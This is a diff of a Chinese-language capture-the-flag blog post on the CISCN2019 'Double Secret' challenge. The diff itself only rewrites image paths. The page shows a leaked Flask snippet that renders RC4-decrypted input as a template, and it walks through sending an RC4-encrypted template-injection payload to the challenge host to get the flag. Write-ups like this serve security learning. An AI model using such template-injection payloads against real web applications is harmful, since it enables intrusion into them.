@@ -29,11 +29,11 @@
 <meta property="og:site_name" content="4chan">
 <meta property="og:description" content="还是太菜了  0X01 打开靶机地址，使用Dirsearch进行扫描查看子目录  Dirsearch扫描网站子目录命令 🍖  1python dirsearch.py -u URL -e.php   在URL后面添加扫面的子目录，只要robots.txt有些提示，提示如下(然并软    😓     )  1It is Android ctf 0X02 使用BP进行抓包 没有任何线索  想起了">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://4chan123.github.io/.io//1.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//2.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//3.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//4.png">
-<meta property="og:image" content="https://4chan123.github.io/.io//5.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png">
 <meta property="article:published_time" content="2021-04-03T12:44:05.000Z">
 <meta property="article:modified_time" content="2021-04-14T06:01:25.843Z">
 <meta property="article:author" content="4Chan">
@@ -41,7 +41,7 @@
 <meta property="article:tag" content="FLASK">
 <meta property="article:tag" content="RC4">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://4chan123.github.io/.io//1.png">
+<meta name="twitter:image" content="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png">
 
 <link rel="canonical" href="https://4chan123.github.io/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/">
 
@@ -309,17 +309,17 @@
 </blockquote>
 <h1>0X03 <strong>重新构造URL</strong></h1>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//1e053da9-5f6a-4ffb-a109-4bbcaf0695d8.node3.buuoj.cn/secret</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.io//1.png" alt="1"></p>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt="1"></p>
 <ul>
 <li><em>根据提示，我们double一下</em></li>
 </ul>
-<p><img src="/.io//2.png" alt="2"></p>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png" alt="2"></p>
 <ul>
 <li><em>我们发现在&quot;secret=&quot;后，后面添加不同数字就会产生不同的数值。（这个时候我们的思路大致是SQL，flask，<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>）💇</em></li>
 </ul>
 <h1>0X04 <strong>经过验证，无法使用php伪协议，SQL注入拿到flag，我们试一试flask（后面页面的内容也证实了我们的观点）</strong></h1>
 <h2 id="1-先随便输入几个字符串"><em>1. 先随便输入几个字符串</em></h2>
-<p><img src="/.io//3.png" alt="3"></p>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png" alt="3"></p>
 <h2 id="2-代码如下-暗示得非常明显了-🐹"><em>2. 代码如下(暗示得非常明显了 🐹 )</em></h2>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">​<span class="keyword">if</span>(secret==None)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="3-进行代码审计🐺"><em>3. 进行代码审计🐺</em></h2>
@@ -331,10 +331,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%<span class="number">14</span>%1E%<span class="number">12</span>%C3%A484mg%C2%9C%C3%8B%<span class="number">00</span>%C2%<span class="number">81</span>%C2%8D%C2%B8%C2%<span class="number">97</span>%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%<span class="number">96</span>%3D%C2%9D%5B%C3%<span class="number">987</span>%C3%AA%<span class="number">12</span>%C2%B4%05%C2%84A%C2%BF%<span class="number">17</span>%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%<span class="number">98</span>/%<span class="number">00</span>%C2%<span class="number">90</span>%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%<span class="number">23</span>%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%<span class="number">92</span></span><br></pre></td></tr></table></figure>
 <h2 id="6-在之前构建的URL后面输入加密的字符串"><em>6.在之前构建的URL后面输入加密的字符串</em></h2>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//2afce8f4-7dee-42fa-bb7a-c9eb932c319e.node3.buuoj.cn/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span></span><br></pre></td></tr></table></figure>
-<p><img src="/.io//4.png" alt="4"></p>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png" alt="4"></p>
 <h1><strong>拿到flag:happy:</strong></h1>
 <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;class&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed. Secret <span class="keyword">is</span> flag&#123;<span class="number">6e76</span>b7ec<span class="number">-1f</span>75<span class="number">-4686</span><span class="number">-8096</span>-bfa9f35caf9f&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/.io//5.png" alt="5"></p>
+<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png" alt="5"></p>
 <h1><strong>总结考点：模板注入，RC4加密，python编写脚本</strong></h1>
 
     </div>
